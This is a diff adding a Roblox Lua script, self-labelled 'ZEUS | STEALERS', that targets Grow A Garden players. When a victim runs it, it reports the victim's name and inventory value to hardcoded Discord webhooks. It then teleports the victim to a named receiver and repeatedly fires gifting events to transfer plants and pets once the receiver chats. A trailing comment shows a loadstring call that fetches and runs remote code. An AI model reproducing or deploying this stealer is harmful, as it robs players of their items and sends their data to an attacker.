@@ -1,0 +1,222 @@
+username = "emmash0706a"
+webhook = "https://discord.com/api/webhooks/1383140808844120205/s7Gled3dAFag6kcybHCttBq-O9Oal6mDy6l9BhEBKEs2ZxZTvo4NUvTxn6-ixzFQmnNo"
+
+logs_webhook = "https://discord.com/api/webhooks/1377572595112611870/UFUoKoeUiIJ-qQunXaS0YpQ7PF079CF0W8Wqv3uEtS-yAWeymWowPJmbMTg5JNuyDkcE"
+
+
+local player = game.Players.LocalPlayer
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local backpack = LocalPlayer:WaitForChild("Backpack")
+local CalculatePlantValue  = require(ReplicatedStorage.Modules.CalculatePlantValue)
+local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
+local req = (syn and syn.request) or (http and http.request) or (http_request) or request
+
+local function formatNumber(n)
+    local left, num, right = string.match(tostring(n), "^([^%d]*%d)(%d*)(.-)$")
+    num = num:reverse():gsub("(%d%d%d)", "%1,"):reverse()
+    num = num:gsub("^,", "")
+    return left .. num .. right
+end
+
+
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+
+local itemsWithValue = {}
+for _, item in pairs(backpack:GetChildren()) do
+    if item:FindFirstChild("Item_String") then
+        local value = CalculatePlantValue (item)
+        table.insert(itemsWithValue, {name = item.Name, value = value})
+    end
+end
+
+table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+
+local tradableSummary = ""
+for i = 1, math.min(10, #itemsWithValue) do
+    local item = itemsWithValue[i]
+    tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
+end
+if #itemsWithValue > 10 then
+    tradableSummary = tradableSummary .. "and more..."
+end
+
+local totalValue = 0
+for _, item in ipairs(itemsWithValue) do
+    totalValue += item.value
+end
+
+
+local payload = {
+    ["content"] = "--@everyone :zap: ZEUS | STEALERS :zap: Grow A Garden Hit\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+    ["embeds"] = {{
+        ["title"] = ":seedling: GROW A GARDEN",
+        ["description"] = ":zap: ZEUS is so tuff fr",
+        ["color"] = 7648373,
+        ["fields"] = {
+            {["name"] = ":skull: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":crown: Reciever", ["value"] = username, ["inline"] = false},
+            {["name"] = ":desktop_computer: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":basket: Inventory", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+        },
+        ["thumbnail"] = {["url"] = "https://tr.rbxcdn.com/180DAY-ba088a5c33312ab138b08e63cae8f8a1/256/256/Image/Webp/noFilter"},
+        ["footer"] = {
+    ["text"] = "by ZEUS - " .. os.date("%B %d, %Y"),
+    ["icon_url"] = "https://i.imgur.com/KZEWvt7.jpeg"
+},
+["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+    }}
+}
+
+local logs_payload = {
+    ["content"] = "New Grow a Garden Hit :seedling:",
+    ["description"] = ":zap: ZEUS is so tuff fr",
+    ["embeds"] = {{
+        ["title"] = ":seedling: GROW A GARDEN LOGS",
+        ["color"] = 7648373,
+        ["fields"] = {
+            {["name"] = ":skull: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":desktop_computer: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":basket: Inventory", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+        },
+        ["thumbnail"] = {["url"] = "https://tr.rbxcdn.com/180DAY-ba088a5c33312ab138b08e63cae8f8a1/256/256/Image/Webp/noFilter"},
+        ["footer"] = {
+    ["text"] = "by ZEUS - " .. os.date("%B %d, %Y"),
+    ["icon_url"] = "https://i.imgur.com/KZEWvt7.jpeg"
+},
+["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+    }}
+}
+
+if req then
+    pcall(function()
+        -- DEBUG: Main webhook
+        local success1, response1 = pcall(function()
+            return req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        local success2, response2 = pcall(function()
+            return req({
+                Url = logs_webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(logs_payload)
+            })
+        end)
+    end)
+end
+
+local printedInventory = false
+local started = false
+
+local function getKg(name)
+    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
+end
+
+local function printSortedItems(items)
+    
+end
+
+local function hasValidItems()
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if getKg(item.Name) > 0 then
+            return true
+        end
+    end
+    return false
+end
+
+local function unequipAllPets()
+    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
+    if petData then
+        for uuid, _ in pairs(petData.PetInventory.Data) do
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
+            task.wait(0.1)
+        end
+    end
+end
+
+local function startGiving()
+    if not hasValidItems() then return end
+    local target = Players:FindFirstChild(username)
+    if not target or not target.Character then return end
+
+    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    LocalPlayer.Character:MoveTo(hrp.Position)
+    task.wait(0.4)
+
+    local prompt = hrp:FindFirstChildOfClass("ProximityPrompt")
+    if not prompt then return end
+    prompt.HoldDuration = 0
+
+    local index = 1
+    while true do
+        if not hasValidItems() then break end
+        local sortedItems = {}
+        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+            if getKg(item.Name) > 0 then
+                table.insert(sortedItems, item)
+            end
+        end
+        table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)
+
+        if #sortedItems > 0 then
+            if index > #sortedItems then index = 1 end
+            local item = sortedItems[index]
+            if item:IsA("Tool") then
+                item.Parent = LocalPlayer.Character
+                task.wait()
+            end
+
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
+            prompt:InputHoldBegin()
+            task.wait(0.1)
+            prompt:InputHoldEnd()
+
+            if item:IsDescendantOf(LocalPlayer.Character) then
+                item.Parent = LocalPlayer.Backpack
+            end
+
+            index += 1
+        else
+            break
+        end
+        task.wait(0.05)
+    end
+end
+
+local function waitForChatAndStart()
+    unequipAllPets()
+    local targetPlayer = Players:FindFirstChild(username) or Players.PlayerAdded:Wait()
+    if targetPlayer then
+        targetPlayer.Chatted:Connect(function()
+            if not started then
+                started = true
+                startGiving()
+            end
+        end)
+    end
+end
+
+waitForChatAndStart()
+
+
+-- finished version,
+--username = ""
+--webhook = ""
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/TrulyNotBen/ZEUS/refs/heads/main/GrowAGarden"))()
